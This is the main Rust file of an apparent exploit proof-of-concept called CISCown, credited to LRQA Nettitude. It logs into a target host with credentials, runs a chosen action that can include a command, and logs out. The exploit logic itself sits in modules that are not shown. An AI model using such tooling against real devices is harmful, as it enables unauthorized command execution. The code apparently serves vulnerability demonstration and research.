mod libs {
    pub mod arguments;
    pub mod actions;
    pub mod encryption;
}
use libs::arguments::Args;
use libs::actions::{get_host_info, handle_action, login, logout};
use libs::encryption::encrypt;
use clap::Parser;
use std::process::exit;


fn headers() {
    println!(" \
   _____ _____  _____  _____                    \n\
  / ____|_   _|/ ____|/ ____|                   \n\
 | |      | | | (___ | |     _____      ___ __   \n\
 | |      | |  \\___ \\| |    / _ \\ \\ /\\ / / '_ \\  \n\
 | |____ _| |_ ____) | |___| (_) \\ V  V /| | | | \n\
  \\_____|_____|_____/ \\_____ \\___/ \\_/\\_/ |_| |_| \n\
		\n");
	println!("~ Because every vulnerability needs a cool tool");
	println!("~ AThacker @ LRQA Nettitude | v1.0\nOxidized by SherllyNeo");
	println!("This proof-of-concept is for demonstration purposes and should not be used for illegal activities.\nLRQA Nettitude are not responsible for any damage caused by the use or misuse of this code.");

}

pub fn cve_run() {
    let args = Args::parse();
    let proxy = None;
    headers();

    let host = format!("https://{}",args.hostname);

    let authenticated = match login(&host,&args.username,&args.password,proxy,encrypt) {
        Ok(auth) => {   
            println!("[+] Logged in");
            auth
        }
        Err(err) => {
            println!("[-] unable to log in due to error: {err}");
            exit(1);
        }
    };

    if args.verbose {
        match get_host_info(&host, &authenticated, proxy) {
            Ok(_) => {},
            Err(err) => eprintln!("unable to print host info {:?}",err)
        };
    }

    match handle_action(&args.action,&host,&authenticated,args.cmd.as_deref(),proxy) {
        Ok(_) => println!("[+] {:?} worked",&args.action),
        Err(err) => eprintln!("[-] {:?} failed: {:?}",&args.action,err)
    }

    match logout(&host,&authenticated.sid.expect("shoul have sid value"),proxy) {
        Ok(_) => {
            println!("[+] Logged out :)");
        }
        Err(err) => {
            panic!("[-] unable to logout in due to error: {err}");
        }
    };

}
